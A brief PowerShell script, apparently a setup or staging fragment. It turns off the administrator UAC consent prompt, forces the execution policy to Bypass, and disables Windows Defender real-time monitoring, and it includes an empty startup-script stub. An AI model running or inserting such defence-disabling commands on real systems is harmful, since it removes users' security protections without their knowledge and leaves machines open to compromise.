
function disableUserAccountControl(){
	Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
}

function installStartupScript(){

}


function setupPermissions(){
    #if Get-ExecutionPolicy == 'Restricted'
    Set-ExecutionPolicy Bypass -Scope Process -Force;
}


# PowerShell: Remove-WindowsFeature Windows-Defender 
Set-MpPreference -DisableRealtimeMonitoring $true;